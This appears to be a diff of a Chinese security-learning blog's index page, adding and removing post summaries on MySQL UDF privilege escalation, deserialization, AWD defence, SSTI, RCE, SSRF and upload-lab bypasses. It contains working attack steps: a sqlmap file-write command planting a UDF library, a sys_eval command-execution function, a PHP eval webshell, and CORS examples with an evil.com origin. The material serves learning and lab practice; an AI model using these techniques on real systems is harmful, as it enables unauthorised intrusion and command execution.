@@ -59,7 +59,7 @@
       
 
 
-<div class="overlay" style="background: #b2aec6;"></div>
+<div class="overlay" style="background: #4d4d4d;background: url('/img/background1.jpg') no-repeat ;"></div>
 <div class="intrude-less">
 	<header id="header" class="inner">
 		<a href="/" class="profilepic">
@@ -136,7 +136,7 @@
       
       
 <nav id="mobile-nav">
-  	<div class="overlay js-overlay" style="background: #b2aec6"></div>
+  	<div class="overlay js-overlay" style="background: #4d4d4d"></div>
 	<div class="btnctn js-mobile-btnctn">
   		<div class="slider-trigger list" q-on="click: openSlider(e)"><i class="icon icon-sort"></i></div>
 	</div>
@@ -212,6 +212,454 @@
           </div>
           <div id="js-content" class="content-ll">
             
+
+  
+    <article id="post-关于编码" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2025/08/09/%E5%85%B3%E4%BA%8E%E7%BC%96%E7%A0%81/" target="_blank">编码</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2025/08/09/%E5%85%B3%E4%BA%8E%E7%BC%96%E7%A0%81/" class="archive-article-date">
+        <time datetime="2025-08-09T09:46:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-08-09</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1 id="关于编码"><a href="#关于编码" class="headerlink" title="关于编码"></a>关于编码</h1><p>此篇文章是关于学习中遇到编码问题的小记</p>
+<p>一篇文章搞懂<code>Unicode</code>，<code>UTF-8</code>，<code>GBK2312</code>和<code>GBK</code></p>
+    
+    <a class="article-more-a" href="/2025/08/09/%E5%85%B3%E4%BA%8E%E7%BC%96%E7%A0%81/#more">more >></a>
+    
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2025/08/09/%E5%85%B3%E4%BA%8E%E7%BC%96%E7%A0%81/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-MySQL提权" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2025/07/23/MySQL%E6%8F%90%E6%9D%83/" target="_blank">MySQL提权</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2025/07/23/MySQL%E6%8F%90%E6%9D%83/" class="archive-article-date">
+        <time datetime="2025-07-23T09:46:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-07-23</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1 id="MySQL提权"><a href="#MySQL提权" class="headerlink" title="MySQL提权"></a>MySQL提权</h1><h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><p>提权之前，要拿到高权限的MySQL用户才行，拿到MySQL的用户名和密码的方法很多，以下列举一些常见的：</p>
+<ol>
+<li><code>MySQL</code> 3306端弱口令爆破</li>
+<li><code>sqlmap</code>注入的<code>--sql-shell</code>模式</li>
+<li>网站的数据库配置文件中拿到明文密码信息</li>
+<li>CVE-2012-2122等这类漏洞拿MySQL权限</li>
+</ol>
+<h2 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h2><p>自定义函数，数据库功能的一种扩展。用户通过自定义函数可以实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL中调用。</p>
+<p>提权有两种方法1.<code>手工复现</code>，2.<code>UDF shell</code></p>
+<h5 id="手工复现"><a href="#手工复现" class="headerlink" title="手工复现"></a>手工复现</h5><p>1.动态链接库</p>
+<p>若MySQL版本&gt;&#x3D;5.1,必须把UDF的动态链接库文件放置在MySQL安装目录下的lib\plugin文件夹下才能创建自定义函数。</p>
+<p><code>sqlmap</code>和<code>Metasploit</code>里面都自带对应系统的动态链接库文件</p>
+<p>sqlmap的UDF动态链接库的文件位置：</p>
+<blockquote>
+<p>sqlmap根目录&#x2F;data&#x2F;udf&#x2F;mysql</p>
+</blockquote>
+<p>注意！sqlmap中自带的这些动态链接库为了防止被误杀都经过编码处理过，不能被直接使用，可以利用sqlmap自带的解码工具cloak.py来解码使用。但是主播不会。。。所以我们拿别人解码后的来用嘿嘿</p>
+<p> [sqlmap udf.zip](&#x2F;files&#x2F;sqlmap udf.zip) </p>
+<p>Metasploit的UDF链接库文件位置：</p>
+<blockquote>
+<p>MSF 根目录&#x2F;embedded&#x2F;framework&#x2F;data&#x2F;exploits&#x2F;mysql</p>
+</blockquote>
+<p>（Metasploit自带的动态链接库文件无需解码，开箱即用</p>
+<p>2.寻找插件目录</p>
+<p>第二步就是把UDF动态链接库放在MySQL的插件目录下，用SQL语句寻找插件目录：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%plugin%&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>当然如果没有的话要手工创建<code>\lib\plugin</code>文件夹</p>
+<p>3.写入动态链接库</p>
+<p>经过以上准备，我们可以直接使用sqlmap来上传动态数据库，因为GET有字节长度限制，所以我们用POST注入</p>
+<p>这里直接偷一个别人的命令；</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://localhost:30008/&quot;</span> --data=<span class="string">&quot;id=1&quot;</span> --file-write=<span class="string">&quot;/Users/sec/Desktop/lib_mysqludf_sys_64.so&quot;</span> --file-dest=<span class="string">&quot;/usr/lib/mysql/plugin/udf.so&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>4.创建自定义函数并调用命令</p>
+<p><strong>只能创建so文件中存在的函数</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> sys_eval <span class="keyword">RETURNS</span> STRING SONAME <span class="string">&#x27;udf.dll&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>导入成功后看一下MySQL函数里是否新增了sys_eval:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.fuc;</span><br></pre></td></tr></table></figure>
+
+<p>成功后即可用这个函数来执行系统命令了，例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> sys_eval(<span class="string">&#x27;whoami&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>5.删除自定义函数</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">drop</span> <span class="keyword">function</span> sys_eval;</span><br></pre></td></tr></table></figure>
+
+<h5 id="UDF-shell"><a href="#UDF-shell" class="headerlink" title="UDF shell"></a>UDF shell</h5><p>若目标MySQL在内网下，无法直接连接或禁止外连，这时我们可以用一些网页脚本</p>
+<p>1.<code>UDF.php</code></p>
+<p><code>t00ls UDF.PHP</code>,一键DUMP UDF和函数</p>
+<p>2.<code>Navicat MySQL</code></p>
+<p>目标MySQL不允许外连，但可以上传PHP脚本，这时候可以用<code>Navicat</code>自带的<code>tunnel</code>隧道脚本上传到目标网站</p>
+<p>具体操作主播也不太会，大家去看大佬的教程：</p>
+<p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/11/mysql.html">https://www.sqlsec.com/2020/11/mysql.html</a></p>
+<p>快速判断堆叠注入用sleep。</p>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2025/07/23/MySQL%E6%8F%90%E6%9D%83/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-comments" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2025/07/21/comments/" target="_blank">留言板</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2025/07/21/comments/" class="archive-article-date">
+        <time datetime="2025-07-21T09:46:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-07-21</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1 id="留言板"><a href="#留言板" class="headerlink" title="留言板"></a>留言板</h1>
+    
+    <a class="article-more-a" href="/2025/07/21/comments/#more">more >></a>
+    
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2025/07/21/comments/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-反序列化漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2025/07/18/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank">反序列化</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2025/07/18/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
+        <time datetime="2025-07-18T09:46:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-07-18</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>**序列化：**把对象转换为字节序列的过程，即把对象转换为可存储或传输的数据的过程。例如将内存中的对象转换为二进制数据流或文件，在网络传输的过程中，可以是字节或XML等格式。</p>
+<p><strong>反序列化</strong>：把字节序列恢复为对象的过程，即把可以存储或传输的数据转换为对象的过程。例如将二进制数据流或文件加载到内存中还原为对象。</p>
+    
+    <a class="article-more-a" href="/2025/07/18/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#more">more >></a>
+    
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2025/07/18/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-awd" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2025/07/17/awd/" target="_blank">awd</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2025/07/17/awd/" class="archive-article-date">
+        <time datetime="2025-07-17T09:46:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-07-17</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1 id="AWD"><a href="#AWD" class="headerlink" title="AWD"></a>AWD</h1><h2 id="基本防守策略"><a href="#基本防守策略" class="headerlink" title="基本防守策略"></a>基本防守策略</h2><h5 id="1、修改用户密码和服务密码"><a href="#1、修改用户密码和服务密码" class="headerlink" title="1、修改用户密码和服务密码"></a>1、修改用户密码和服务密码</h5><ol>
+<li><p>修改linux密码：</p>
+<p><code>#passwd</code></p>
+<p>如果有权限就删除用户</p>
+<p><code>userdel -r [用户名]</code></p>
+<p>如果提权为root</p>
+<p><code>cat/etc/passwd</code></p>
+<p>如果有bash就是这用用户可以登录，没有就不可以，过滤一下<code>cat/etc/passwd | grep bash</code></p>
+<p>可以删掉有bash的后门用户</p>
+</li>
+</ol>
+    
+    <a class="article-more-a" href="/2025/07/17/awd/#more">more >></a>
+    
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2025/07/17/awd/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
 
   
     <article id="post-docker" class="article article-type-post  article-index" itemscope itemprop="blogPost">
@@ -405,7 +853,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 请求头</span><br><span class="line">Origin: https://evil.com</span><br><span class="line"></span><br><span class="line">// 响应头</span><br><span class="line">Access-Control-Allow-Origin: https://evil.com</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>CORS 漏洞的核心在于<strong>服务器错误地信任了不应信任的 Origin</strong>，从而导致敏感信息泄露或权限操作被越权。</p>
-<h3 id="常见成因"><a href="#常见成因" class="headerlink" title="常见成因"></a>常见成因</h3><h5 id="1-任意Origin允许"><a href="#1-任意Origin允许" class="headerlink" title="1.任意Origin允许"></a>1.任意Origin允许</h5><p>有一个接口返回<code>Access-Control-Allow-Origin: *</code>但返回的是敏感信息(如用户信息，token等)</p>
+<h3 id="常见成因"><a href="#常见成因" class="headerlink" title="常见成因"></a>常见成因</h3><h5 id="1-任意Origin允许"><a href="#1-任意Origin允许" class="headerlink" title="1.任意Origin允许"></a>1.任意Origin允许</h5><p>有一个接口返回<code>Access-Control-Allow-Origin: *</code>但返回的是敏感信息(如用户信息，token等)（*表示允许任何来源的请求</p>
 <h5 id="2-搭配Access-Control-Allow-Credentials-true泄露Cookie"><a href="#2-搭配Access-Control-Allow-Credentials-true泄露Cookie" class="headerlink" title="2.搭配Access-Control-Allow-Credentials: true泄露Cookie"></a>2.搭配<code>Access-Control-Allow-Credentials: true</code>泄露Cookie</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: https://evil.com</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure>
 
 <p>这表示服务器允许携带 cookie 的跨域请求，<strong>一旦 Origin 是攻击者控制的域名，就可能借助受害者的 cookie 获取其权限下的敏感数据。</strong></p>
@@ -597,425 +1045,6 @@
     
     <p class="article-more-link">
       <a class="article-more-a" href="/2025/05/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-ssti" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2025/04/26/ssti/" target="_blank">ssti</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2025/04/26/ssti/" class="archive-article-date">
-        <time datetime="2025-04-26T04:59:47.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-04-26</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h1 id="ssti模板注入"><a href="#ssti模板注入" class="headerlink" title="ssti模板注入"></a>ssti模板注入</h1><h3 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h3><p>服务端接收了用户的恶意输入后，未经任何处理就将其作为web应用模板内容的一部分，模板引擎<strong>在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句</strong>，因而可能导致了敏感信息泄露，代码执行，GetShell等问题。其影响范围主要取决于模板引擎的复杂性。</p>
-<p>同常规的 SQL 注入检测，XSS 检测一样，模板注入漏洞的检测也是向传递的参数中承载特定 Payload 并根据返回的内容来进行判断的。</p>
-<p>凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。</p>
-    
-    <a class="article-more-a" href="/2025/04/26/ssti/#more">more >></a>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2025/04/26/ssti/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-RCE" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2025/04/11/RCE/" target="_blank">RCE</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2025/04/11/RCE/" class="archive-article-date">
-        <time datetime="2025-04-11T08:42:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-04-11</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h4 id="rce漏洞："><a href="#rce漏洞：" class="headerlink" title="rce漏洞："></a>rce漏洞：</h4><p>在web应用开发中为了灵活性、简洁性等会让应用调用代码执行函数或系统命令执行函数处理，若应用对用户的输入过滤不严，容易产生远程代码执行漏洞或命令执行漏洞；</p>
-<h2 id="常见RCE漏洞函数"><a href="#常见RCE漏洞函数" class="headerlink" title="常见RCE漏洞函数"></a>常见RCE漏洞函数</h2><h3 id="远程命令执行（ping）函数："><a href="#远程命令执行（ping）函数：" class="headerlink" title="远程命令执行（ping）函数："></a>远程命令执行（ping）函数：</h3><p><strong>system()：将字符串作为OS命令执行，返回执行结果；</strong></p>
-<p>语法为<code>system(string $command, int &amp;$return var = ?)</code>，command: 执行 command 参数所指定的命令常用参数并且输出执行结果，如果提供 return var 参数，则外部命令执行后的返回状态将会被设置到此变量中。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">示例：system(&#x27;Is&#x27;)直接返回当前文件下的目录</span><br></pre></td></tr></table></figure>
-
-<p>exec()：将字符串作为OS命令执行，只返回执行结果的最后一行（约等于无回显；</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">示例：exec(&quot;cat/flag&quot;) 无回显</span><br></pre></td></tr></table></figure>
-
-<p>shell_exec() &#x2F; 反引号&#96;&#96;：将字符串作为OS命令执行；</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">示例：shell_exec(Is) / `Is` 无回显，用echo/print输出结果</span><br></pre></td></tr></table></figure>
-
-<p>passthru()：将字符串作为OS命令执行，能回显，system()平替；</p>
-<p>pcntl_exec()：在当前进程空间执行指定程序；</p>
-<p>popen() &#x2F; proc_open()：打开进程文件指针；</p>
-<h3 id="远程代码执行（evel）函数："><a href="#远程代码执行（evel）函数：" class="headerlink" title="远程代码执行（evel）函数："></a>远程代码执行（evel）函数：</h3><p><strong>eval() &#x2F; assert()：将字符串作为php代码执行；</strong></p>
-<p>preg_replace()：正则匹配替换字符串；</p>
-<p>create_function()：主要创建匿名函数；</p>
-<p>call_user_func()：回调函数，第一个参数为函数名，第二个参数为函数参数；</p>
-<p>call_user_func_array()：回调函数，第一个参数为函数名，第二个参数为函数参数的数组；</p>
-
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2025/04/11/RCE/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-SSRF服务器端请求伪造" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2025/04/07/SSRF%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/" target="_blank">SSRF服务器端请求伪造</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2025/04/07/SSRF%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/" class="archive-article-date">
-        <time datetime="2025-04-07T15:27:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-04-07</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h1 id="SSRF服务器端请求伪造"><a href="#SSRF服务器端请求伪造" class="headerlink" title="SSRF服务器端请求伪造"></a>SSRF服务器端请求伪造</h1><p>SSRF形成原因是服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制，比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等。</p>
-<p><strong>利用：</strong></p>
-<p><strong>主要用来进行内网探测，也可以说是内网信息收集，存活主机和开放端口。</strong></p>
-<ul>
-<li>对外网服务器所在的内网进行端口扫描，获取一些服务的banner信息（如mysql版本等</li>
-<li>有时候可攻击运行在内网或本地的应用程序，如通过ssrf给内网的redis写定时任务，实现反弹shell</li>
-<li>用file协议读取本地文件</li>
-<li>用各种伪协议进行探测：http，file，dict，gopher等</li>
-<li>攻击内外网的web应用，如structs2，sql注入等</li>
-</ul>
-    
-    <a class="article-more-a" href="/2025/04/07/SSRF%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/#more">more >></a>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2025/04/07/SSRF%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-文件上传漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2025/02/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" target="_blank">文件上传漏洞一些wp</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2025/02/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
-        <time datetime="2025-02-12T15:27:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-02-12</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <p>稍微写写uplode-labss靶场的题解</p>
-<h6 id="1-前端拦截绕过"><a href="#1-前端拦截绕过" class="headerlink" title="1.前端拦截绕过"></a>1.前端拦截绕过</h6><p>一句话木马<code>&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;</code>改成1.jpg上传再在bp改成1.php就行</p>
-<h6 id="2-content-type绕过"><a href="#2-content-type绕过" class="headerlink" title="2.content-type绕过"></a>2.content-type绕过</h6><p>后端拦截，bp能抓到包，正常上传1.php再改content-type改成能通过的就行</p>
-    
-    <a class="article-more-a" href="/2025/02/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#more">more >></a>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2025/02/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-php" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2025/02/08/php/" target="_blank">php</a>
-  
-    </h1>
-  
-
-
